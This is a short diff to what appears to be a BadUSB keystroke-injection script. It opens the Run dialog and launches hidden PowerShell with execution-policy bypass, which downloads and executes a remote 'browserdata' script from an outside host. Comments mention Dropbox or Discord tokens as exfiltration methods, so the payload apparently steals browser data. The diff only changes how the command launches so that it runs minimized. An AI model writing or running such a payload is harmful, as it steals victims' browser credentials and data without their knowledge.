@@ -10,7 +10,7 @@ REM	Update the $db with the access token of Dropbox ( which has file write permi
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm badusb.39039820.xyz/browserdata | iex
+STRING cmd /c start /min "" powershell -w h -ep bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/browserdata | iex"
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
